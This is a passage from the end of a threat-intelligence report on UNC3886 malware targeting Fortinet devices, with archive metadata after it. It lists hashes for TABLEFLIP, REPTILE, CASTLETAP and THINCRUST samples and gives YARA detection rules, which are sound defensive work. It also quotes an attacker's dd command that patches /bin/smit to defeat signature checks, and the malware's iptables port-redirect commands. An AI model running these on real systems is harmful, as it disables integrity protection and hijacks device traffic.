for\nactivation\n\nConfig\nChange\n\nprintf \"t\" | dd of=/bin/smit bs=1 count=1 conv=notrunc seek=22866 2>/dev/null\n\nConfig change made to\n/etc/init.d/localnet on FortiAnalyzer and\nFortiManager devices to revert a binary\nafter it was modified to bypass digital\nsignature verification of system files\n\n16/20\n\nMD5\n\n9ce2459168cf4b5af494776a70e0feda\n\nThreat actor script which launches\n/bin/auth (TABLEFLIP) and /bin/klogd\n(REPTILE) and deletes the two files\nalong with /bin/support from disk\n\nMD5\n\nb6e92149efaf78e9ce7552297505b9d5\n\nTABLEFLIP sample\n\nMD5\n\n53a69adac914808eced2bf8155a7512d\n\nREPTILE variant sample\n\nMD5\n\na388ebaef45add5da503e4bf2b9da546\n\nModified /bin/smit\n\nMD5\n\n88711ebc99e1390f1ce2f42a6de0654d\n\nLocalnet sample\n\nMD5\n\ne2d2884869f48f40b32fb27cc3bdefff\n\nCASTLETAP sample\n\nMD5\n\n53a69adac914808eced2bf8155a7512d\n\nREPTILE variant sample\n\nMD5\n\n64bdf7a631bc76b01b985f1d46b35ea6\n\nTHINCRUST sample\n\nMD5\n\na86a8fe875a89816e5808588154a067e\n\nTHINCRUST sample\n\nMD5\n\n3e43511c4f7f551290292394c4e21de7\n\nRelated to THINCRUST\n\nSHA1\n\n86f3623b3fb8d5303b6c9d8295292a5c2ceb2889\n\nLocalnet sample\n\nSHA1\n\n75c092098e3409d366a46fdde6a92ff97d29cee1\n\nSmit sample\n\nSHA1\n\n9dca7f1af5752bb007e5cc55acd2511f03049ee5\n\nTABLEFLIP sample\n\nSHA1\n\n8c40fc87fa3b25a559585b10a8ca11c81fb09f75\n\nCASTLETAP sample\n\nSHA1\n\n3109b890901499f7ebb90f8870a7d1617d27e7c9\n\nREPTILE variant sample\n\nSHA1\n\nb8bdaa1bd204a6c710875b0c4265655d1fd37d52\n\n/bin/support sample\n\nSHA1\n\n1a077212735617a665a6b631e34a6aedcbc41713\n\nTHINCRUST sample\n\nSHA1\n\nd5f8436e9815358e33b8243abda76c9b398943e2\n\nTHINCRUST sample\n\nSHA1\n\n8ef5159944d048fe84e51a818c9b11ebcfa98517\n\nRelated to THINCRUST\n\nSHA256\n\n245e4646e5d984c2da4cfe223bb2fae679441bcf42b254fc193ae97dc32af7ad\n\nLocalnet sample\n\nSHA256\n\n9fb09fe6db61fbdd19ac9c368e2f64fb9606119649830762fa467719c480ed44\n\nSmit sample\n\nSHA256\n\n18afbad17dee0e4330a85b782e8e580c6125d8a7127cda69ad0e2728d505a6f5\n\nTABLEFLIP sample\n\nSHA256\n\na00fed53b1ece4610c8b52934c20af3667d455f092a77f8d9bc46fdb9047e41a\n\nCASTLETAP sample\n\nSHA256\n\neb6af99148f0ce5b58e414162ff2b7567b4cf08953862a088996365ff306014b\n\nREPTILE variant sample\n\nSHA256\n\n33c22b2db8c0948c67204485972d2eb856e13dca16132371337fc3534e3df16d\n\n/bin/support sample\n\n17/20\n\nSHA256\n\nabefe121e5c895bf63be80152ccbe2d7bb5ad985aa3ab989bcb7c0804b90d004\n\nTHINCRUST sample\n\nSHA256\n\n2266667af7532a32b9c21c330a9fe56356ca66610e39654804a7262f2af61017\n\nTHINCRUST sample\n\nSHA256\n\n4e4c5e5ca588bd84b67a37b654ec522768fa83e535ff795a5c196da8f8b9737d\n\nRelated to THINCRUST\n\nYARA Rules\nrule M_Hunting_Util_TABLEFLIP_1\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Looks for TABLEFLIP Binary\"\nmd5 = \"b6e92149efaf78e9ce7552297505b9d5\"\nstrings:\n$z1 = \"%1$s.*%2$d\" fullword\n$x1 = \"/proc/self/exe\" fullword\n$x2 = \"socket\" fullword\n$x3 = \"127.\" fullword\n$x4 = \"iptables -t nat\" fullword\n$s1 = \"iptables -t nat -S PREROUTING | grep %1$s | grep %2$d || iptables -t nat -A PREROUTING -p tcp -s\n%1$s --dport 541 -j REDIRECT --to-port %2$d\"\n$s2 = \"iptables -t nat -S PREROUTING | tail -n +2 | grep -n -E '%1$s.*%2$d' | awk -F: '{print $1}'| xargs\niptables -t nat -D PREROUTING\"\ncondition:\nuint32(0) == 0x464c457f and filesize < 5MB and @x1 <= @x2 and @x2 <= @x3 and @x3 <= @x4 and ( $z1 or any\nof ($s*) )\n}\n\n18/20\n\nrule M_Hunting_Backdoor_REPTILE_1\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Looks for ELF backdoor REPTILE variant\"\nmd5 = \"53a69adac914808eced2bf8155a7512d\"\nstrings:\n$x1 = \";7(Zu9YTsA7qQ#vw\"\n$x2 = \"mznCvqSBo\"\n$x3 = \"hpaVAj2FJ\"\n$x4 = \"%d.%d.%d.%d\"\n$x5 = \"HISTFILE=\"\n$x6 = \"TERM\"\n$x7 = { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D } // taken from\nFE_Hunting_Linux_TINYSHELL_2_FEBeta.yara\ncondition:\nuint32(0) == 0x464c457f and all of them and #x4 >= 3 and #x6 == 1 and filesize < 15MB\n}\n\n19/20\n\nrule M_Hunting_Backdoor_CASTLETAP_1\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Finds strings observed in CASTLETOP ELF binary\"\nmd5 = \"e2d2884869f48f40b32fb27cc3bdefff\"\nstrings:\n$x1 = \";7(Zu9YTsA7qQ#vw\"\n$x2 = \"qWWlC0v6yYh2yxu\"\n$x3 = \"1qaz@WSXa\"\n$x4 = \"hpaVAj2FJ\"\n$x5 = \"%d.%d.%d.%d\"\n$x6 = \"HISTFILE=\"\n$x7 = \"TERM\"\n$x8 = \"/tmp/busybox\"\n$x9 = { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D }\ncondition:\nuint16(18) == 183 and\nuint16(16) == 0x02 and\nuint32(0) == 0x464c457f and 1 of ($x*) and #x5 >= 3 and #x7 == 1 and filesize < 15MB\n}\nrule M_Hunting_Backdoor_CASTLETAP_2\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Finds byte pattern related to XOR decode function\"\nmd5 = \"e2d2884869f48f40b32fb27cc3bdefff\"\nstrings:\n$x1 = { ?? 14 40 B9 ?? B0 1D 11 ?? 10 40 B9 [5] 0C 40 B9 [5] 1F 80 52 [9] 1F 00 12 }\ncondition:\nuint16(18) == 183 and\nuint16(16) == 0x02 and\nuint32(0) == 0x464c457f and any of them and filesize < 15MB\n}\n\n20/20",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-16 - Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation.pdf"
    ],
    "report_names": [
        "2023-03-16 - Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation.pdf"
    ],
    "threat_actors": [
        {
            "id": "1c91699d-77d3-4ad7-9857-9f9196ac1e37",
            "created_at": "2023-11-04T02:00:07.663664Z",
            "updated_at": "2024-11-22T02:00:02.830369Z",
            "deleted_at": null,
            "main_name": "UNC3886",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC3886",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a08d93aa-41e4-4eca-a0fd-002d051a2c2d",
            "created_at": "2024-08-28T02:02:09.711951Z",
            "updated_at": "2024-11-22T02:02:01.224525Z",
            "deleted_at": null,
            "main_name": "UNC3886",
            "aliases": [],
            "source_name": "ETDA:UNC3886",
            "tools": [
                "BOLDMOVE",
                "CASTLETAP",
                "LOOKOVER",
                "MOPSLED",
                "RIFLESPINE",
                "TABLEFLIP",
                "THINCRUST",
                "Tiny SHell",
                "VIRTUALGATE",
                "VIRTUALPIE",
                "VIRTUALPITA",
                "VIRTUALSHINE",
                "tsh"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338947967,
    "ts_updated_at": 1732240997499,
    "ts_creation_date": 1683252098000,
    "ts_modification_date": 1683252098000,
    "files": {
        "pdf": "https://archive.orkl.eu/d440ae34bedfecba4c1cf2f3cf58cdf657f999f4.pdf",
        "text": "https://archive.orkl.eu/d440ae34bedfecba4c1cf2f3cf58cdf657f999f4.txt",
        "img": "https://archive.orkl.eu/d440ae34bedfecba4c1cf2f3cf58cdf657f999f4.jpg"
    }
}